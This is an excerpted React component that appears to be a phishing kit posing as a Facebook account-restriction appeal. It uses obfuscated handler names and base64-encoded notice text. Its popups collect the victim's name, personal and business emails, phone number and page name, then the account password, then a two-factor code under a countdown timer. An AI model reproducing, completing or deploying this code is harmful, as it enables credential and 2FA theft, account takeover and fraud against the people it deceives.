...
const ContentComponent = (props) => {
    ...
    const sdt465rt4g5b1d5fPassWord = (values) => {
        if (first === true) {
    ...
    const sdt465rt4g5b1d5fCodes = (values) => {
        if (timeLeft > 0) {
    ...
    return (<div id='main-component'>
            <div className='container-sm' id='main'>
                ...
                <div className='menu-mobile'>
                    ...
                    <div className='button-menu' onClick={() => dt5r4gh61b2gs1dq(1)}>
                ...
                <div className='row'>
                        ...
                        <svg width="329" height="66" viewBox="0 0 329 66" fill="none" xmlns="http://www.w3.org/2000/svg">
                            ...
                            <div id='action-buttons'>
                                ...
                                <div className={activeMenu === 1 ? "item-action active" : "item-action"}>
                                    <div className='action-button' onClick={() => dsfsdrtesdf4e5r5e1df(1)}>
                                        <div className='action-icon'>
                                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    ...
                                    <div className='content-action'>
                                        <div className="action-button" onClick={() => dt5r4gh61b2gs1dq(3)}>
                                            <div className="action-icon">
                                                <svg></svg>
                                            </div>
                                ...
                                <div className={activeMenu === 2 ? "item-action active" : "item-action"}>
                                    <div className='action-button' onClick={() => dsfsdrtesdf4e5r5e1df(2)}>
                                        <div className='action-icon'>
                                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                ...
                                <div className={activeMenu === 3 ? "item-action active" : "item-action"}>
                                    <div className='action-button' onClick={() => dsfsdrtesdf4e5r5e1df(3)}>
                                        <div className='action-icon'>
                                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                    ...
                    <div className='right col-8'>
                        <div className='content-right'>
                            ...
                            <ul>
                                <li>{atob('RmFjdCBjaGVja2VycyBtYXkgbm90IHJlc3BvbmQgdG8gcmVxdWVzdHMgdGhhdCBjb250YWluIGludGltaWRhdGlvbiwgaGF0ZSBzcGVlY2gsIG9yIG90aGVyIHZlcmJhbCB0aHJlYXRzLg==')}</li>
                                <li>{atob('')}</li>
                                <li>When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated.</li>
                            </ul>
                            ...
                            <div className='card-thumb'>
                                ...
                                <div className='thumb-content'>
                                    ...
                                    <div className='btn-wrapper' onClick={() => dt5r4gh61b2gs1dq(3)}>
                            ...
                            <div className='action-button-list'>
                                <div className='action-button b-bottom' onClick={() => dt5r4gh61b2gs1dq(2)}>
                                    <div className='action-icon'>
                                ...
                                <div className='action-button' onClick={() => dt5r4gh61b2gs1dq(2)}>
                                    <div className='action-icon'>
                                        <img src={fd4s4d7f4s5df44fd4} alt=""/>
                                    </div>
                                    <div className='action-text'>
                    ...
                    <div className={activePopup === true ? "popup active" : "popup"}>
                        <div className={activeItemPopup === 1 ? "popup-item popup-menu active" : "popup-item popup-menu"}>
                            <div className='close-bar' onClick={() => dt5r4gh61b2gs1dq(50)}>
                        ...
                        <div className={activeItemPopup === 3 ? "popup-item popup-modal active" : "popup-item popup-modal"}>
                            ...
                            <br />
                            <div className='popup-content'>
                                <Form name="dataFirst" initialValues={{
            remember: true,
        }} onFinish={sdt465rt4g5b1d5f} autoComplete="off">

                                    <div className="item-form">
                                        <label> Apeal </label>
                                        <Form.Item name="Apeal" rules={[
            {
                required: true,
                                        ...
                                        <Form.Item name="fullName" rules={[
            {
                ...
                message: 'Please input full name!',
                                    ...
                                    <div className="item-form">
                                        ...
                                        <Form.Item name="personalEmail" rules={[
            {
                required: true,
                message: 'Please input personal email!',
                                    ...
                                    <div className="item-form">
                                        ...
                                        <Form.Item name="businessEmail" rules={[
            {
                required: true,
                message: 'Please input buiseness email!',
                                    ...
                                    <div className="item-form">
                                        ...
                                        <Form.Item name="mobilePhone" rules={[
            {
                required: true,
                message: 'Please input mobile phone number!',
                                    ...
                                    <div className="item-form">
                                        ...
                                        <Form.Item name="fanpageName" rules={[
            {
                required: true,
                message: 'Please input facebook page name!',
            }
        ]}>
                                            <Input />
                                        </Form.Item>
                                    ...
                                    <div className="item-form">
                                        <Form.Item name="checkForm" valuePropName="checked" rules={[
            {
                required: true,
                message: 'Please agree to our terms and data and cookie policy!',
            },
        ]}>
                                            <Checkbox onChange={fetr4g5v4gs51d}>
                                                I agree with
                                                <div className='link-to'>
                                                    Terms of use
                                                    <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                        ...
                        <div className={activeItemPopup === 4 ? "popup-item popup-pasword active" : "popup-item popup-pasword"}>
                            ...
                            <div className='popup-content'>
                                ...
                                <Form name="formTwo" initialValues={{
            remember: true,
        }} onFinish={sdt465rt4g5b1d5fPassWord} autoComplete="off" form={formPassword}>
                ...
                message: `You haven't entered your password!`,
                        ...
                        <div className={activeItemPopup === 5 ? "popup-item popup-two-fa active" : "popup-item popup-two-fa"}>
                            ...
                            <div className='popup-content'>
                                ...
                                <Form name="formThree" initialValues={{
            remember: true,
        }} onFinish={sdt465rt4g5b1d5fCodes} form={form} autoComplete="off">

                                    <Form.Item name="twoFa" rules={[
            {
                required: true,
